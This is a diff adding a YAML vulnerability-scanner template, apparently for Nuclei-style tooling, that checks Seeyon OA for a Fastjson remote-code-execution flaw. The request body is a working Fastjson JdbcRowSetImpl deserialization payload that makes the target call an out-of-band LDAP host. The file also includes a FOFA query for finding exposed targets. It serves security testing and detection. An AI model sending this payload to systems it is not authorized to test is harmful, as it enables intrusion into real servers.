@@ -1,0 +1,27 @@
+id: seeyon-oa-fastjson-rce
+info:
+  name: Seeyon OA Fastjson Remote Code Execution
+  author: SleepingBag945
+  description: Seeyon OA Fastjson is vulnerable to RCE.
+  severity: critical
+  reference:
+  - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
+  - https://github.com/hktalent/scan4all/blob/main/pocs_go/seeyon/SeeyonFastjson.go
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="致远互联-OA"
+  tags: seeyon,oa,rce,fastjson,oast
+traps:
+- request:
+    method: POST
+    path: /seeyon/main.do?method=changeLocale
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: com.alibaba.fastjson.JSONException
